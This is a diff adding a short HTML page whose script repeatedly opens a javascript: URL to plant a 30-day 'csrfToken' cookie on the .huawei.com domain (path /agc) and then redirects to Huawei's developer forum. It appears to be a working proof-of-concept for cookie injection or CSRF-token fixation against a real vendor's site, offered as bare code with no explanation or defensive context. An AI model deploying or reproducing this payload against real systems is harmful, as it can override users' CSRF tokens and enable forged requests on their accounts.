@@ -1,0 +1,7 @@
+<html>
+  <script>
+    window.noalert = true;
+    setInterval(() => { window.open("javascript:if(!window.noalert){let d = new Date();d.setTime(d.getTime()+(30*24*60*60*1000));let expires = 'expires='+d.toGMTString();document.cookie = 'csrfToken=injectByScript;' + expires + '; domain=.huawei.com; path=/agc';}") }, 1);
+    location.href="https://developer.huawei.com/consumer/cn/forum/";
+  </script>
+</html>
